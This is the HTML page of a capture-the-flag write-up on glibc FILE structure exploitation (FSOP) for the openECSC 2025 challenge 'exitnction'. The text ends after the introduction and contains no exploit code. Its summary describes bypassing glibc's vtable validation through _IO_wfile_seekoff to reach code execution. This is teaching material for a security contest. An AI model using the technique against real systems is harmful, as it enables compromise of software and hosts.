<!DOCTYPE html><html class="bg-background text-foreground scheme-light-dark" lang="en-US"> <head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes"><meta name="generator" content="Astro v5.8.0"><meta name="HandheldFriendly" content="True"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="format-detection" content="telephone=no,date=no,address=no,email=no,url=no"><meta name="theme-color" content="#121212" media="(prefers-color-scheme: dark)"><meta name="theme-color" content="#121212" media="(prefers-color-scheme: light)"><link rel="sitemap" href="/sitemap-index.xml"><link rel="manifest" href="/site.webmanifest"><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><script type="module" src="/_astro/ClientRouter.astro_astro_type_script_index_0_lang.CtSceO8m.js"></script><title>Introduction to file struct exploitation: openECSC 2025 – pwn/exitnction | z0v3r1n&#39;s blog</title><meta name="title" content="Introduction to file struct exploitation: openECSC 2025 – pwn/exitnction | z0v3r1n's blog"><link rel="canonical" href="https://z0v3r1n.github.io"><meta property="og:title" content="Introduction to file struct exploitation: openECSC 2025 – pwn/exitnction"><meta property="og:image" content="https://z0v3r1n.github.io/static/1200x630.png"><meta property="og:image:alt" content="Introduction to file struct exploitation: openECSC 2025 – pwn/exitnction"><meta property="og:type" content="website"><meta property="og:locale" content="en-US"><meta property="og:site_name" content="z0v3r1n's blog"><meta property="og:url" content="https://z0v3r1n.github.io/blog/openecsc-2025_exitnction/"><meta name="twitter:title" content="Introduction to file struct exploitation: openECSC 2025 – pwn/exitnction"><meta property="twitter:image" content="https://z0v3r1n.github.io/static/1200x630.png"><meta name="twitter:image:alt" content="Introduction to file struct exploitation: openECSC 2025 – pwn/exitnction"><meta name="twitter:card" content="summary_large_image"><meta property="article:tag" content="fsop"><meta property="article:tag" content="pwn"><meta property="article:tag" content="openECSC"><link rel="stylesheet" href="/_astro/about.DQPP2Tja.css"></head><body class="flex h-fit min-h-screen flex-col gap-y-6 font-sans"> <header class="bg-background/50 sticky top-0 z-50 divide-y backdrop-blur-sm xl:divide-none"> <div> <div class="mx-auto flex max-w-3xl items-center justify-between gap-4 px-4 py-3"> <a href="/" target="_self" class="transition-colors duration-300 ease-in-out flex shrink-0 items-center justify-center gap-3">  <span class="hidden h-full text-lg leading-none font-medium min-[400px]:block">z0v3r1n&#39;s blog</span>  </a> <div class="flex items-center gap-4"> <nav class="flex items-center gap-4 text-sm sm:gap-6"> <a href="/blog" target="_self" class="inline-block duration-300 ease-in-out text-foreground/60 hover:text-foreground transition-colors"> blog/
 </a><a href="/about" target="_self" class="inline-block duration-300 ease-in-out text-foreground/60 hover:text-foreground transition-colors"> about/
 </a> </nav> <button data-slot="button" class="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-muted hover:text-foreground dark:hover:bg-muted/50 -my-2 -me-2 size-8" id="theme-toggle" title="Toggle theme"> <svg width="1em" height="1em" class="size-4 dark:hidden" data-icon="lucide:sun">   <symbol id="ai:lucide:sun" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><circle cx="12" cy="12" r="4"/><path d="M12 2v2m0 16v2M4.93 4.93l1.41 1.41m11.32 11.32l1.41 1.41M2 12h2m16 0h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></g></symbol><use href="#ai:lucide:sun"></use>  </svg> <svg width="1em" height="1em" class="absolute hidden size-4 dark:block" data-icon="lucide:moon">   <symbol id="ai:lucide:moon" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3a6 6 0 0 0 9 9a9 9 0 1 1-9-9"/></symbol><use href="#ai:lucide:moon"></use>  </svg> <span class="sr-only">Toggle theme</span> </button> <script data-astro-rerun>
  (() => {
    const theme = (() => {
      const stored = localStorage?.getItem('theme') ?? ''
      if (['dark', 'light'].includes(stored)) return stored
      return window.matchMedia('(prefers-color-scheme: dark)').matches
        ? 'dark'
        : 'light'
    })()

    document.documentElement.setAttribute('data-theme', theme)
    window.localStorage.setItem('theme', theme)
  })()
</script> <script type="module">function a(){const e=document.documentElement,n=e.getAttribute("data-theme")==="dark"?"light":"dark";e.classList.add("[&_*]:transition-none"),e.setAttribute("data-theme",n),window.getComputedStyle(e).getPropertyValue("opacity"),requestAnimationFrame(()=>{e.classList.remove("[&_*]:transition-none")}),localStorage.setItem("theme",n)}function o(){document.getElementById("theme-toggle")?.addEventListener("click",a)}o();document.addEventListener("astro:after-swap",()=>{const e=localStorage.getItem("theme")||"light",t=document.documentElement;t.classList.add("[&_*]:transition-none"),window.getComputedStyle(t).getPropertyValue("opacity"),t.setAttribute("data-theme",e),requestAnimationFrame(()=>{t.classList.remove("[&_*]:transition-none")}),o()});</script> </div> </div> </div>  <div id="mobile-toc-container" class="w-full xl:hidden"><details class="group"><summary class="flex w-full cursor-pointer items-center justify-between"><div class="mx-auto flex w-full max-w-3xl items-center px-4 py-3"><div class="relative mr-2 size-4"><svg class="h-4 w-4" viewBox="0 0 24 24"><circle class="text-primary/20" cx="12" cy="12" r="10" fill="none" stroke="currentColor" stroke-width="2"></circle><circle id="mobile-toc-progress-circle" class="text-primary" cx="12" cy="12" r="10" fill="none" stroke="currentColor" stroke-width="2" stroke-dasharray="62.83" stroke-dashoffset="62.83" transform="rotate(-90 12 12)"></circle></svg></div><span id="mobile-toc-current-section" class="text-muted-foreground flex-grow truncate text-sm">
Overview
</span><span class="text-muted-foreground ml-2"><svg width="1em" height="1em" class="h-4 w-4 transition-transform duration-200 group-open:rotate-180" data-icon="lucide:chevron-down">   <symbol id="ai:lucide:chevron-down" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m6 9l6 6l6-6"/></symbol><use href="#ai:lucide:chevron-down"></use>  </svg></span></div></summary><style>astro-island,astro-slot,astro-static-slot{display:contents}</style><script>(()=>{var e=async t=>{await(await t())()};(self.Astro||(self.Astro={})).load=e;window.dispatchEvent(new Event("astro:load"));})();;(()=>{var A=Object.defineProperty;var g=(i,o,a)=>o in i?A(i,o,{enumerable:!0,configurable:!0,writable:!0,value:a}):i[o]=a;var d=(i,o,a)=>g(i,typeof o!="symbol"?o+"":o,a);{let i={0:t=>m(t),1:t=>a(t),2:t=>new RegExp(t),3:t=>new Date(t),4:t=>new Map(a(t)),5:t=>new Set(a(t)),6:t=>BigInt(t),7:t=>new URL(t),8:t=>new Uint8Array(t),9:t=>new Uint16Array(t),10:t=>new Uint32Array(t),11:t=>1/0*t},o=t=>{let[l,e]=t;return l in i?i[l](e):void 0},a=t=>t.map(o),m=t=>typeof t!="object"||t===null?t:Object.fromEntries(Object.entries(t).map(([l,e])=>[l,o(e)]));class y extends HTMLElement{constructor(){super(...arguments);d(this,"Component");d(this,"hydrator");d(this,"hydrate",async()=>{var b;if(!this.hydrator||!this.isConnected)return;let e=(b=this.parentElement)==null?void 0:b.closest("astro-island[ssr]");if(e){e.addEventListener("astro:hydrate",this.hydrate,{once:!0});return}let c=this.querySelectorAll("astro-slot"),n={},h=this.querySelectorAll("template[data-astro-template]");for(let r of h){let s=r.closest(this.tagName);s!=null&&s.isSameNode(this)&&(n[r.getAttribute("data-astro-template")||"default"]=r.innerHTML,r.remove())}for(let r of c){let s=r.closest(this.tagName);s!=null&&s.isSameNode(this)&&(n[r.getAttribute("name")||"default"]=r.innerHTML)}let p;try{p=this.hasAttribute("props")?m(JSON.parse(this.getAttribute("props"))):{}}catch(r){let s=this.getAttribute("component-url")||"<unknown>",v=this.getAttribute("component-export");throw v&&(s+=` (export ${v})`),console.error(`[hydrate] Error parsing props for component ${s}`,this.getAttribute("props"),r),r}let u;await this.hydrator(this)(this.Component,p,n,{client:this.getAttribute("client")}),this.removeAttribute("ssr"),this.dispatchEvent(new CustomEvent("astro:hydrate"))});d(this,"unmount",()=>{this.isConnected||this.dispatchEvent(new CustomEvent("astro:unmount"))})}disconnectedCallback(){document.removeEventListener("astro:after-swap",this.unmount),document.addEventListener("astro:after-swap",this.unmount,{once:!0})}connectedCallback(){if(!this.hasAttribute("await-children")||document.readyState==="interactive"||document.readyState==="complete")this.childrenConnectedCallback();else{let e=()=>{document.removeEventListener("DOMContentLoaded",e),c.disconnect(),this.childrenConnectedCallback()},c=new MutationObserver(()=>{var n;((n=this.lastChild)==null?void 0:n.nodeType)===Node.COMMENT_NODE&&this.lastChild.nodeValue==="astro:end"&&(this.lastChild.remove(),e())});c.observe(this,{childList:!0}),document.addEventListener("DOMContentLoaded",e)}}async childrenConnectedCallback(){let e=this.getAttribute("before-hydration-url");e&&await import(e),this.start()}async start(){let e=JSON.parse(this.getAttribute("opts")),c=this.getAttribute("client");if(Astro[c]===void 0){window.addEventListener(`astro:${c}`,()=>this.start(),{once:!0});return}try{await Astro[c](async()=>{let n=this.getAttribute("renderer-url"),[h,{default:p}]=await Promise.all([import(this.getAttribute("component-url")),n?import(n):()=>()=>{}]),u=this.getAttribute("component-export")||"default";if(!u.includes("."))this.Component=h[u];else{this.Component=h;for(let f of u.split("."))this.Component=this.Component[f]}return this.hydrator=p,this.hydrate},e,this)}catch(n){console.error(`[astro-island] Error hydrating ${this.getAttribute("component-url")}`,n)}}attributeChangedCallback(){this.hydrate()}}d(y,"observedAttributes",["props"]),customElements.get("astro-island")||customElements.define("astro-island",y)}})();</script><astro-island uid="DFMLW" prefix="r4" component-url="/_astro/scroll-area.C86c4as2.js" component-export="ScrollArea" renderer-url="/_astro/client.ekDkyiUY.js" props="{&quot;className&quot;:[0,&quot;mx-auto max-w-3xl&quot;],&quot;data-toc-header-scroll&quot;:[0,true]}" ssr client="load" opts="{&quot;name&quot;:&quot;ScrollArea&quot;,&quot;value&quot;:true}" await-children><div dir="ltr" data-slot="scroll-area" class="relative mx-auto max-w-3xl" data-toc-header-scroll="true" style="position:relative;--radix-scroll-area-corner-width:0px;--radix-scroll-area-corner-height:0px"><style>[data-radix-scroll-area-viewport]{scrollbar-width:none;-ms-overflow-style:none;-webkit-overflow-scrolling:touch;}[data-radix-scroll-area-viewport]::-webkit-scrollbar{display:none}</style><div data-radix-scroll-area-viewport="" data-slot="scroll-area-viewport" class="ring-ring/10 dark:ring-ring/20 dark:outline-ring/40 outline-ring/50 size-full rounded-[inherit] transition-[color,box-shadow] focus-visible:ring-4 focus-visible:outline-1" style="overflow-x:hidden;overflow-y:hidden"><div style="min-width:100%;display:table"><astro-slot><div class="max-h-[30vh]"><ul class="flex list-none flex-col gap-y-2 px-4 pb-4" id="mobile-table-of-contents"><li class="px-4 text-sm text-foreground/60"><a href="#tldr" class="mobile-toc-item underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-id="tldr">TL;DR</a></li><li class="px-4 text-sm text-foreground/60"><a href="#background" class="mobile-toc-item underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-id="background">Background</a></li><li class="px-4 text-sm text-foreground/60"><a href="#first-look" class="mobile-toc-item underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-id="first-look">First Look</a></li><li class="px-4 text-sm text-foreground/60"><a href="#dissecting-the-program" class="mobile-toc-item underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-id="dissecting-the-program">Dissecting the Program</a></li><li class="px-4 text-sm text-foreground/60"><a href="#exploitation" class="mobile-toc-item underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-id="exploitation">Exploitation</a></li><li class="px-4 text-sm ml-4 text-foreground/60"><a href="#what-are-file-structs-_io_file--_io_file_plus" class="mobile-toc-item underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-id="what-are-file-structs-_io_file--_io_file_plus">What are file structs? _IO_FILE &amp; _IO_FILE_plus</a></li><li class="px-4 text-sm ml-4 text-foreground/60"><a href="#why-overwrite-a-file" class="mobile-toc-item underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-id="why-overwrite-a-file">Why Overwrite a FILE?</a></li><li class="px-4 text-sm ml-4 text-foreground/60"><a href="#stop--theres-a-vtable-gatekeeper" class="mobile-toc-item underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-id="stop--theres-a-vtable-gatekeeper">Stop — There’s a Vtable Gatekeeper</a></li><li class="px-4 text-sm ml-4 text-foreground/60"><a href="#_io_wfile_seekoff-saves-the-day" class="mobile-toc-item underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-id="_io_wfile_seekoff-saves-the-day">_IO_wfile_seekoff saves the day</a></li><li class="px-4 text-sm ml-4 text-foreground/60"><a href="#planting-the-seed--what-where--why" class="mobile-toc-item underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-id="planting-the-seed--what-where--why">Planting the Seed — What, Where &amp; Why?</a></li><li class="px-4 text-sm ml-4 text-foreground/60"><a href="#now-what--poc-time" class="mobile-toc-item underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-id="now-what--poc-time">Now What — PoC Time!</a></li><li class="px-4 text-sm ml-4 text-foreground/60"><a href="#field-goal-nah--full-touchdown" class="mobile-toc-item underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-id="field-goal-nah--full-touchdown">Field Goal? Nah — Full Touchdown</a></li><li class="px-4 text-sm text-foreground/60"><a href="#conclusion" class="mobile-toc-item underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-id="conclusion">Conclusion</a></li><li class="px-4 text-sm text-foreground/60"><a href="#references" class="mobile-toc-item underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-id="references">References</a></li></ul></div></astro-slot></div></div></div><!--astro:end--></astro-island></details></div><script type="module" src="/_astro/TOCHeader.astro_astro_type_script_index_0_lang.CKMLAwWj.js"></script> </header> <main class="w-full mx-auto flex grow flex-col gap-y-6 px-4">   <section class="grid grid-cols-[minmax(0px,1fr)_min(calc(var(--breakpoint-md)-2rem),100%)_minmax(0px,1fr)] gap-y-6">  <section class="col-start-2 flex flex-col gap-y-6 text-center"> <div class="flex flex-col"> <h1 class="mb-2 scroll-mt-31 text-3xl leading-tight font-medium sm:text-4xl" id="post-title"> Introduction to file struct exploitation: openECSC 2025 – pwn/exitnction </h1> <div class="text-muted-foreground divide-border mb-4 flex flex-col items-center justify-center divide-y text-xs sm:flex-row sm:flex-wrap sm:divide-x sm:divide-y-0 sm:text-sm"> <div class="flex w-full items-center justify-center gap-2 py-2 sm:w-fit sm:px-2 sm:py-0 first:sm:pl-0 last:sm:pr-0"> <span>October 14, 2025</span> </div> <div class="flex w-full items-center justify-center gap-2 py-2 sm:w-fit sm:px-2 sm:py-0 first:sm:pl-0 last:sm:pr-0"> <span> 20 min read  </span> </div>  </div> <div class="flex flex-wrap justify-center gap-2"> <a href="/tags/fsop" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&#38;>svg]:size-3 gap-1 [&#38;>svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-muted text-foreground [a&#38;]:hover:bg-muted/90"> <svg width="1em" height="1em" class="size-3" data-icon="lucide:hash">   <symbol id="ai:lucide:hash" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 9h16M4 15h16M10 3L8 21m8-18l-2 18"/></symbol><use href="#ai:lucide:hash"></use>  </svg> fsop </a><a href="/tags/pwn" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&#38;>svg]:size-3 gap-1 [&#38;>svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-muted text-foreground [a&#38;]:hover:bg-muted/90"> <svg width="1em" height="1em" viewBox="0 0 24 24" class="size-3" data-icon="lucide:hash">   <use href="#ai:lucide:hash"></use>  </svg> pwn </a><a href="/tags/openECSC" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&#38;>svg]:size-3 gap-1 [&#38;>svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-muted text-foreground [a&#38;]:hover:bg-muted/90"> <svg width="1em" height="1em" viewBox="0 0 24 24" class="size-3" data-icon="lucide:hash">   <use href="#ai:lucide:hash"></use>  </svg> openECSC </a> </div> </div> <nav class="col-start-2 grid grid-cols-1 gap-4 sm:grid-cols-2"> <a href="/blog/securinets-quals-2025_easy_jail#post-title" target="_self" class="duration-300 ease-in-out gap-2 whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&#38;_svg]:pointer-events-none [&#38;_svg:not([class*='size-'])]:size-4 shrink-0 [&#38;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 px-4 py-2 has-[>svg]:px-3 rounded-lg group flex items-center justify-start size-full" aria-disabled="false">  <svg width="1em" height="1em" class="mr-2 size-4 transition-transform group-hover:-translate-x-1" data-icon="lucide:arrow-left">   <symbol id="ai:lucide:arrow-left" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m12 19l-7-7l7-7m7 7H5"/></symbol><use href="#ai:lucide:arrow-left"></use>  </svg> <div class="flex flex-col items-start overflow-hidden text-wrap"> <span class="text-muted-foreground text-left text-xs"> Previous Post </span> <span class="w-full text-left text-sm text-balance text-ellipsis"> Securinets Quals 2025 – misc/easy-jail: pyjail </span> </div>  </a>  <a href="/blog/buckeye-2025_heap_exploitation#post-title" target="_self" class="duration-300 ease-in-out gap-2 whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&#38;_svg]:pointer-events-none [&#38;_svg:not([class*='size-'])]:size-4 shrink-0 [&#38;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 px-4 py-2 has-[>svg]:px-3 rounded-lg group flex items-center justify-end size-full" aria-disabled="false">  <div class="flex flex-col items-end overflow-hidden text-wrap"> <span class="text-muted-foreground text-right text-xs"> Next Post </span> <span class="w-full text-right text-sm text-balance text-ellipsis"> Buckeye 2025 – forensics/heap_exploitation? </span> </div> <svg width="1em" height="1em" class="ml-2 size-4 transition-transform group-hover:translate-x-1" data-icon="lucide:arrow-right">   <symbol id="ai:lucide:arrow-right" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 12h14m-7-7l7 7l-7 7"/></symbol><use href="#ai:lucide:arrow-right"></use>  </svg>  </a> </nav> </section> <div id="toc-sidebar-container" class="sticky top-20 col-start-1 row-span-1 mr-8 ml-auto hidden h-[calc(100vh-5rem)] max-w-md xl:block"><astro-island uid="1dWiQg" prefix="r6" component-url="/_astro/scroll-area.C86c4as2.js" component-export="ScrollArea" renderer-url="/_astro/client.ekDkyiUY.js" props="{&quot;className&quot;:[0,&quot;flex max-h-[calc(100vh-8rem)] flex-col overflow-y-auto&quot;],&quot;type&quot;:[0,&quot;hover&quot;],&quot;data-toc-scroll-area&quot;:[0,true]}" ssr client="load" opts="{&quot;name&quot;:&quot;ScrollArea&quot;,&quot;value&quot;:true}" await-children><div dir="ltr" data-slot="scroll-area" class="relative flex max-h-[calc(100vh-8rem)] flex-col overflow-y-auto" data-toc-scroll-area="true" style="position:relative;--radix-scroll-area-corner-width:0px;--radix-scroll-area-corner-height:0px"><style>[data-radix-scroll-area-viewport]{scrollbar-width:none;-ms-overflow-style:none;-webkit-overflow-scrolling:touch;}[data-radix-scroll-area-viewport]::-webkit-scrollbar{display:none}</style><div data-radix-scroll-area-viewport="" data-slot="scroll-area-viewport" class="ring-ring/10 dark:ring-ring/20 dark:outline-ring/40 outline-ring/50 size-full rounded-[inherit] transition-[color,box-shadow] focus-visible:ring-4 focus-visible:outline-1" style="overflow-x:hidden;overflow-y:hidden"><div style="min-width:100%;display:table"><astro-slot><div class="flex flex-col gap-2 px-4"><span class="text-lg font-medium">Table of Contents</span><ul class="flex list-none flex-col gap-y-2"><li class="text-sm text-foreground/60"><a href="#tldr" class="marker:text-foreground/30 list-none underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-link="tldr">TL;DR</a></li><li class="text-sm text-foreground/60"><a href="#background" class="marker:text-foreground/30 list-none underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-link="background">Background</a></li><li class="text-sm text-foreground/60"><a href="#first-look" class="marker:text-foreground/30 list-none underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-link="first-look">First Look</a></li><li class="text-sm text-foreground/60"><a href="#dissecting-the-program" class="marker:text-foreground/30 list-none underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-link="dissecting-the-program">Dissecting the Program</a></li><li class="text-sm text-foreground/60"><a href="#exploitation" class="marker:text-foreground/30 list-none underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-link="exploitation">Exploitation</a></li><li class="text-sm ml-4 text-foreground/60"><a href="#what-are-file-structs-_io_file--_io_file_plus" class="marker:text-foreground/30 list-none underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-link="what-are-file-structs-_io_file--_io_file_plus">What are file structs? _IO_FILE &amp; _IO_FILE_plus</a></li><li class="text-sm ml-4 text-foreground/60"><a href="#why-overwrite-a-file" class="marker:text-foreground/30 list-none underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-link="why-overwrite-a-file">Why Overwrite a FILE?</a></li><li class="text-sm ml-4 text-foreground/60"><a href="#stop--theres-a-vtable-gatekeeper" class="marker:text-foreground/30 list-none underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-link="stop--theres-a-vtable-gatekeeper">Stop — There’s a Vtable Gatekeeper</a></li><li class="text-sm ml-4 text-foreground/60"><a href="#_io_wfile_seekoff-saves-the-day" class="marker:text-foreground/30 list-none underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-link="_io_wfile_seekoff-saves-the-day">_IO_wfile_seekoff saves the day</a></li><li class="text-sm ml-4 text-foreground/60"><a href="#planting-the-seed--what-where--why" class="marker:text-foreground/30 list-none underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-link="planting-the-seed--what-where--why">Planting the Seed — What, Where &amp; Why?</a></li><li class="text-sm ml-4 text-foreground/60"><a href="#now-what--poc-time" class="marker:text-foreground/30 list-none underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-link="now-what--poc-time">Now What — PoC Time!</a></li><li class="text-sm ml-4 text-foreground/60"><a href="#field-goal-nah--full-touchdown" class="marker:text-foreground/30 list-none underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-link="field-goal-nah--full-touchdown">Field Goal? Nah — Full Touchdown</a></li><li class="text-sm text-foreground/60"><a href="#conclusion" class="marker:text-foreground/30 list-none underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-link="conclusion">Conclusion</a></li><li class="text-sm text-foreground/60"><a href="#references" class="marker:text-foreground/30 list-none underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-link="references">References</a></li></ul></div></astro-slot></div></div></div><!--astro:end--></astro-island></div><script type="module">class f{links=document.querySelectorAll("[data-heading-link]");activeIds=[];headings=[];regions=[];scrollArea=null;tocScrollArea=null;reset(){this.links=document.querySelectorAll("#toc-sidebar-container [data-heading-link]"),this.activeIds=[],this.headings=[],this.regions=[];const t=document.getElementById("toc-sidebar-container");this.scrollArea=t?.querySelector("[data-radix-scroll-area-viewport]")||null,this.tocScrollArea=t?.querySelector("[data-toc-scroll-area]")||null}}const e=new f;class c{static build(){if(e.headings=Array.from(document.querySelectorAll(".prose h2, .prose h3, .prose h4, .prose h5, .prose h6")),e.headings.length===0){e.regions=[];return}e.regions=e.headings.map((t,o)=>{const i=e.headings[o+1];return{id:t.id,start:t.offsetTop,end:i?i.offsetTop:document.body.scrollHeight}})}static getVisibleIds(){if(e.headings.length===0)return[];const t=window.scrollY+150,o=window.scrollY+window.innerHeight,i=new Set,l=(s,r)=>s>=t&&s<=o||r>=t&&r<=o||s<=t&&r>=o;return e.headings.forEach(s=>{const r=s.offsetTop+s.offsetHeight;l(s.offsetTop,r)&&i.add(s.id)}),e.regions.forEach(s=>{if(s.start<=o&&s.end>=t){const r=document.getElementById(s.id);if(r){const a=r.offsetTop+r.offsetHeight;s.end>a&&(a<o||t<s.end)&&i.add(s.id)}}}),Array.from(i)}}class h{static update(){if(!e.scrollArea||!e.tocScrollArea)return;const{scrollTop:t,scrollHeight:o,clientHeight:i}=e.scrollArea,l=5,s=t<=l,r=t>=o-i-l;e.tocScrollArea.classList.toggle("mask-t-from-90%",!s),e.tocScrollArea.classList.toggle("mask-b-from-90%",!r)}}class g{static update(t){e.links.forEach(o=>{o.classList.remove("text-foreground")}),t.forEach(o=>{if(o){const i=document.querySelector(`#toc-sidebar-container [data-heading-link="${o}"]`);i&&i.classList.add("text-foreground")}}),this.scrollToActive(t)}static scrollToActive(t){if(!e.scrollArea||!t.length)return;const o=document.querySelector(`#toc-sidebar-container [data-heading-link="${t[0]}"]`);if(!o)return;const{top:i,height:l}=e.scrollArea.getBoundingClientRect(),{top:s,height:r}=o.getBoundingClientRect(),a=s-i+e.scrollArea.scrollTop,u=Math.max(0,Math.min(a-(l-r)/2,e.scrollArea.scrollHeight-e.scrollArea.clientHeight));Math.abs(u-e.scrollArea.scrollTop)>5&&(e.scrollArea.scrollTop=u)}}class d{static handleScroll(){const t=c.getVisibleIds();JSON.stringify(t)!==JSON.stringify(e.activeIds)&&(e.activeIds=t,g.update(e.activeIds))}static handleTOCScroll=()=>h.update();static handleResize(){c.build();const t=c.getVisibleIds();JSON.stringify(t)!==JSON.stringify(e.activeIds)&&(e.activeIds=t,g.update(e.activeIds)),h.update()}static init(){if(e.reset(),c.build(),e.headings.length===0){g.update([]);return}this.handleScroll(),setTimeout(h.update,100);const t={passive:!0};window.addEventListener("scroll",this.handleScroll,t),window.addEventListener("resize",this.handleResize,t),e.scrollArea?.addEventListener("scroll",this.handleTOCScroll,t)}static cleanup(){window.removeEventListener("scroll",this.handleScroll),window.removeEventListener("resize",this.handleResize),e.scrollArea?.removeEventListener("scroll",this.handleTOCScroll),Object.assign(e,{activeIds:[],headings:[],regions:[],scrollArea:null,tocScrollArea:null})}}document.addEventListener("astro:page-load",()=>d.init());document.addEventListener("astro:after-swap",()=>{d.cleanup(),d.init()});document.addEventListener("astro:before-swap",()=>d.cleanup());</script> <article class="prose col-start-2 max-w-none"> <p><img src="https://github.com/user-attachments/assets/1d984a88-3fd5-419b-aca0-5e64948618d9" alt/></p>
<h2 id="tldr">TL;DR</h2>
<p>Used <code>_IO_wfile_seekoff</code> as the vtable entry point for fsop to pivot into <code>_wide_data-&gt;_wide_vtable-&gt;__overflow</code>, bypassing glibc’s vtable validation and achieving code execution.</p>
<h2 id="background">Background</h2>
<p>Before diving in — quick disclaimer. I’m <strong>not</strong> an FSOP wizard or a heap master or any of that. This was literally my <em>first proper</em> <code>FILE</code> structure exploitation challenge. I learned the whole <code>fsop</code> stuff <em>just to solve this chall</em>, so if you spot something off, feel free to message me on discord!</p>
<p>This writeup was made as a submission in best writeup competition for openECSC 2025, and I tried to make it as clean and beginner-readable as possible — explaining every decision I made while debugging. I also mixed in some glibc internals exploration since I wanted to understand what was actually happening rather than just cargo-culting someone else’s PoC.</p>
<p>So yeah — if something looks cursed, it probably is, but it worked :)</p>
<h2 id="first-look">First Look</h2>
<p>Let’s take a look at the files we are given:</p>
